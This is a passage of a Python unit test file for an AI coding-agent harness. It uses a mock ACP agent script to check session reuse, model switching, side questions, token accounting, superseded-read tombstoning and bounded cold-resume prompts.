                "                'options': [\n"
                "                    {'value': 'gemini-4-argon', 'name': 'Gemini 4 Argon'},\n"
                "                    {'value': 'gemini-3.8-flash', 'name': 'Gemini 3.8 Flash'},\n"
                "                ],\n"
                "            }],\n"
                "        }\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'id': rid, 'result': res}) + '\\n')\n"
                "        sys.stdout.flush()\n"
                "    elif m == 'session/set_model':\n"
                "        cur_model = obj['params']['modelId']\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'id': rid, 'result': {}}) + '\\n')\n"
                "        sys.stdout.flush()\n"
                "    elif m == 'session/prompt':\n"
                "        sid = obj['params']['sessionId']\n"
                "        p_dump = json.dumps(obj['params']['prompt'])\n"
                "        if 'SIDE_QUESTION /btw' in p_dump:\n"
                "            txt = 'BTW_SIDE_ANSWER_OK'\n"
                "        else:\n"
                "            step += 1\n"
                "            if step == 1:\n"
                "                txt = '<crux_tool_call>{\"name\": \"read_file\", \"arguments\": {\"path\": \"spec.txt\"}}</crux_tool_call>'\n"
                "            elif step == 2:\n"
                "                # Assistant quotes `<dynamic_instructions>` in Markdown — must NOT break Turn 2 fingerprint!\n"
                "                txt = 'Explained `<dynamic_instructions>skills</dynamic_instructions>` cleanly in Turn 1.'\n"
                "            elif step == 3:\n"
                "                # Re-reading `spec.txt` triggers `tombstone_superseded_reads` on Step 4!\n"
                "                txt = '<crux_tool_call>{\"name\": \"read_file\", \"arguments\": {\"path\": \"spec.txt\"}}</crux_tool_call>'\n"
                "            elif step == 4:\n"
                "                txt = 'Completed Turn 2 after superseded read tombstoning.'\n"
                "            else:\n"
                "                txt = f'Answered Turn 3 directly on {cur_model} without repeating Turn 1!'\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'method': 'session/update', 'params': {\n"
                "            'sessionId': sid,\n"
                "            'update': {'sessionUpdate': 'agent_thought_chunk', 'content': {'type': 'text', 'text': f'Thought {step}'}}\n"
                "        }}) + '\\n')\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'method': 'session/update', 'params': {\n"
                "            'sessionId': sid,\n"
                "            'update': {'sessionUpdate': 'agent_message_chunk', 'content': {'type': 'text', 'text': txt}}\n"
                "        }}) + '\\n')\n"
                "        sys.stdout.write(json.dumps({'jsonrpc': '2.0', 'id': rid, 'result': {\n"
                "            'stopReason': 'end_turn',\n"
                "            'usage': {'inputTokens': 200, 'outputTokens': 25, 'cachedReadTokens': 800, 'thoughtTokens': 10}\n"
                "        }}) + '\\n')\n"
                "        sys.stdout.flush()\n",
                encoding="utf-8",
            )
            os.chmod(mock_agy, 0o700)

            with mock.patch.dict(
                os.environ,
                {"USH_HOME": str(home), "USH_DISABLE_KEYCHAIN": "1", "CRUX_AGY_BIN": str(mock_agy)},
                clear=False,
            ):
                try:
                    vault = CredentialVault(home, probe_ambient=False)
                    prof = login_antigravity_acp(vault, profile_name="antigravity", run_login_if_needed=False)
                    sk_mgr = SkillManager(
                        ws,
                        ush_home=home,
                        is_workspace_trusted=True,
                        extension_skill_dirs=[root / "skills"],
                        include_user_ecosystem_dirs=False,
                    )
                    runner = SessionRunner(
                        workspace_root=ws,
                        client=UniversalModelClient(vault, HttpProviderTransport(vault)),
                        auth_profile=prof,
                        model_profile=resolve_model_profile("gemini-4-argon", "antigravity"),
                        mode=PermissionMode.AUTO_EDIT,
                        tools=build_default_tool_registry(),
                        skill_manager=sk_mgr,
                        ush_home=home,
                    )
                    try:
                        # Turn 1: BM25 skill delta injects `<dynamic_instructions>`, reads `spec.txt`, quotes `<dynamic_instructions>`
                        t1 = runner.run_turn("Inspect evaluator benchmark plugin and spec.txt")
                        self.assertIn("<dynamic_instructions>", t1.final_message.plain_text())
                        # `TokenUsage.input_tokens` = `raw_in (200) + cached_in (800) = 1000` per step (`0.80` cache hit rate!)
                        self.assertEqual(t1.final_message.usage.input_tokens, 1000)
                        self.assertAlmostEqual(t1.final_message.usage.cache_hit_rate, 0.80)

                        # Mid-session `/btw` (`tools=[]`) MUST NOT clobber the main ACP session!
                        btw = runner.ask_btw("Quick side check?")
                        self.assertEqual(btw.plain_text(), "BTW_SIDE_ANSWER_OK")

                        # Turn 2: Re-reads `spec.txt` -> triggers `tombstone_superseded_reads` on Turn 1's tool output!
                        t2 = runner.run_turn("Re-verify spec.txt for evaluator harness")
                        self.assertEqual(t2.final_message.plain_text(), "Completed Turn 2 after superseded read tombstoning.")

                        # Turn 3: Switch live model (`gemini-4-argon` -> `gemini-3.8-flash`) -> foreign thoughts scrubbed, SAME ACP session kept!
                        runner.model_profile = resolve_model_profile("gemini-3.8-flash", "antigravity")
                        t3 = runner.run_turn("What is the final decision?")
                        self.assertIn("gemini-3.8-flash-high", t3.final_message.plain_text())

                        # Verify ALL 5 main-session `session/prompt` calls used `acp_live_1` and NEVER re-sent `<crux_system_instructions>` after step 1!
                        logged = [json.loads(ln) for ln in rpc_log.read_text(encoding="utf-8").splitlines() if ln.strip()]
                        main_prompts = [
                            rec["params"]
                            for rec in logged
                            if rec["method"] == "session/prompt"
                            and "SIDE_QUESTION /btw" not in json.dumps(rec["params"]["prompt"])
                        ]
                        self.assertEqual(len(main_prompts), 5)
                        self.assertTrue(all(p["sessionId"] == "acp_live_1" for p in main_prompts))
                        self.assertIn("<crux_system_instructions>", json.dumps(main_prompts[0]["prompt"]))
                        for idx_p, follow_p in enumerate(main_prompts[1:], start=2):
                            dumped = json.dumps(follow_p["prompt"])
                            self.assertNotIn(
                                "<crux_system_instructions>",
                                dumped,
                                f"Main step {idx_p} unexpectedly cold-restarted ACP session!",
                            )
                    finally:
                        runner.close()
                finally:
                    close_all_agy_bridges()

        # 13d. Tail-safe cold hydration (`crux -c` resume of an 800,000-char session) stays `<= 135,000` chars & keeps latest prompt verbatim!
        huge_msgs: list[CanonicalMessage] = []
        for turn_i in range(1, 36):
            u_parts = [CanonicalPart(kind="text", text=f"Turn {turn_i} user objective: build module_{turn_i}.py")]
            if turn_i == 35:
                u_parts.append(wrap_dynamic_instructions("<skills_delta>eval</skills_delta>"))
            huge_msgs.append(CanonicalMessage(role="user", parts=u_parts, entry_id=f"u_{turn_i}"))
            if turn_i < 35:
                huge_msgs.append(
                    CanonicalMessage(
                        role="assistant",
                        parts=[
                            CanonicalPart(
                                kind="tool_call",
                                tool_call_id=f"c_{turn_i}",
                                tool_name="read_file",
                                tool_args={"path": f"src/module_{turn_i}.py"},
                            )
                        ],
                        entry_id=f"a_tc_{turn_i}",
                    )
                )
                huge_msgs.append(
                    CanonicalMessage(
                        role="tool",
                        parts=[
                            CanonicalPart(
                                kind="tool_result",
                                tool_call_id=f"c_{turn_i}",
                                tool_name="read_file",
                                text=(f"# File src/module_{turn_i}.py\n" + ("x = 42  # padding payload line\n" * 800)),
                            )
                        ],
                        entry_id=f"t_{turn_i}",
                    )
                )
                huge_msgs.append(
                    CanonicalMessage(
                        role="assistant",
                        parts=[
                            CanonicalPart(
                                kind="text",
                                text=(f"Completed analysis of module_{turn_i}.py.\n" + ("Detailed section summary line.\n" * 90)),
                            )
                        ],
                        entry_id=f"a_ans_{turn_i}",
                    )
                )
        raw_total = sum(len(p.text or "") for m in huge_msgs for p in m.parts)
        self.assertGreater(raw_total, 800_000)

        cold_blocks = _build_bounded_cold_prompt_blocks(
            system_prompt="Crucible system prompt",
            tool_decl="<crux_tool_protocol>tools</crux_tool_protocol>",
            messages=huge_msgs,
        )
        cold_chars = _blocks_char_len(cold_blocks)
        self.assertLessEqual(cold_chars, MAX_ACP_PROMPT_CHARS)
        full_cold_txt = "\n".join(str(b.get("text") or "") for b in cold_blocks)
        self.assertIn("<prior_conversation_digest>", full_cold_txt)
        self.assertIn("Turn 1 user objective: build module_1.py", full_cold_txt)
        self.assertIn("<current_user_request>", cold_blocks[-1]["text"])
        self.assertIn("Turn 35 user objective: build module_35.py", cold_blocks[-1]["text"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
